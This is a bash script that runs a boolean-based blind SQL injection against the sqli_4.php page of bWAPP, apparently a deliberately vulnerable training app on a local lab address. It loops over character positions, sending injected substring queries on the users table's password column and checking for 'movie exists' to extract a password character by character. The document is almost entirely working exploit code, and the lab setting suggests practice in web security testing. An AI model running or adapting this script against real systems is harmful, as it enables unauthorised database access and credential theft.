#!/bin/bash

# Base URL and headers for the curl request
base_url="http://192.168.1.252/bWAPP/sqli_4.php"
headers=(
    -H 'Host: 192.168.1.252'
    -H 'Upgrade-Insecure-Requests: 1'
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36'
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    -H 'Referer: http://192.168.1.252/bWAPP/sqli_4.php?title=Iron+Man'
    -H 'Accept-Encoding: gzip, deflate'
    -H 'Accept-Language: en-US,en;q=0.9'
    -H 'Connection: close'
    -b 'PHPSESSID=b1716907df8d396703a040a4b457fdc1; security_level=0'
)

# Read alphanumeric values into an array for efficiency
# Requires a file in current directory with alpha+num characters
mapfile -t alphanums < alphanum

# Loop through each position and character to brute-force the password
for number in $(seq 0 40); do
    for alphanum in "${alphanums[@]}"; do
        # Construct and perform the curl request
        attempt=$(curl -s -k -X GET "${headers[@]}" \
            "$base_url?title=Iron+Man%27+AND+substring%28%28SELECT+password+FROM+bWAPP.users+limit+1%2C1%29%2C$number%2C1%29%3D%27$alphanum%27%3B+%23&action=search" \
            | grep -c "movie exists")

        # Check the response and print matching character
        if [[ "$attempt" -gt 0 ]]; then
            echo -ne "$alphanum"
            break  # Exit inner loop once the correct character is found for this position
        fi
    done
done

# Print a newline after the password is retrieved
echo ""
